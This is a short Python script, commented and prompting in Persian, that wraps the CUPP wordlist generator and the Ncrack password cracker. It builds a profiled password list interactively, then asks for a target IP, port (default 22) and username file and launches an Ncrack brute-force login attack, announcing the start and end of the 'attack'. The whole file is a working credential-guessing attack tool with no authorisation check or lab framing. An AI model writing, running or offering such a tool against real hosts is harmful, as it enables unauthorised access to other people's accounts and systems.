import os
import subprocess

def check_installation():
    """بررسی وجود CUPP و Ncrack"""
    try:
        subprocess.run(['python3', 'cupp.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print("CUPP نصب نشده است. لطفاً آن را نصب کنید.")
        exit(1)

    if subprocess.call(['ncrack', '-h'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
        print("Ncrack نصب نشده است. لطفاً آن را نصب کنید.")
        exit(1)

def generate_password_list():
    """تولید لیست پسورد با CUPP"""
    print("تولید لیست پسورد...")
    subprocess.run(['python3', 'cupp.py', '-i'])

def get_input(prompt, default=None):
    """دریافت ورودی از کاربر با مقدار پیش‌فرض"""
    user_input = input(prompt)
    return user_input if user_input else default

def main():
    check_installation()
    generate_password_list()

    password_file = get_input("لطفاً نام فایل لیست پسورد را وارد کنید (به طور پیش‌فرض 'passwords.txt'): ", 'passwords.txt')
    
    if not os.path.isfile(password_file):
        print(f"فایل '{password_file}' پیدا نشد. لطفاً دوباره تلاش کنید.")
        exit(1)

    target_ip = get_input("لطفاً آدرس IP هدف را وارد کنید: ")
    target_port = get_input("لطفاً پورت هدف را وارد کنید (به طور پیش‌فرض 22): ", '22')

    usernames_file = get_input("لطفاً نام فایل کاربری را وارد کنید (به طور پیش‌فرض 'usernames.txt'): ", 'usernames.txt')
    
    if not os.path.isfile(usernames_file):
        print(f"فایل '{usernames_file}' پیدا نشد. لطفاً دوباره تلاش کنید.")
        exit(1)

    print("شروع حمله پسورد با Ncrack...")
    subprocess.run(['ncrack', '-p', target_port, '-U', usernames_file, '-P', password_file, target_ip])

    print("حمله به پایان رسید.")

if __name__ == "__main__":
    main()
